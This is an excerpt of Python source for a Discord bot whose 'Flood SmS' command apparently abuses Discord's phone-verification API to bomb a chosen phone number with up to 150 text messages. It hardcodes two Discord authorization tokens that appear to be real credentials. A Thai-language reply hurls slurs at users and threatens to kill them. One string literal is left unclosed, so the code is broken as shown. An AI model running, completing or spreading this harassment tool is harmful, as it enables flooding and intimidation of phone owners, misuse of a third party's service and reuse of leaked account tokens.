...
token = "OTU0NjgwMjE4OTczNTE5OTEy.YjWpPQ.gYeru6OUy9rgsBKTV3A3pWxoIXQ"
...
def cang12(phone):
    post("https://discord.com/api/v9/users/@me/phone",
         ...
         headers={
             "authorization":
             "OTA4MjA2NjE4NjE1OTA2Mzg1.Ycz2Hw.TdQLC2lIwn6UQDl1xBsyJGLnjOw"
         })
...
async def sms(ctx, phone, amount: int):
    ...
    if (amount < 151):
        ...
        embes = discord.Embed(title="Flood SmS",
                              description="Bot by : กูเอง",
                              color=0xff4612)
        ...
        await ctx.channel.send(
            "กูบอกว่ายิงไม่เกิน150ไง ไอสัสพวกเหี้ย กูฆ่ามึงแน่")


@bot.command()
async def help(ctx):
    emBed = discord.Embed(title="Bot BY: กูเอง,
                          description="วิธิใช้",
                          color=0xff4612)
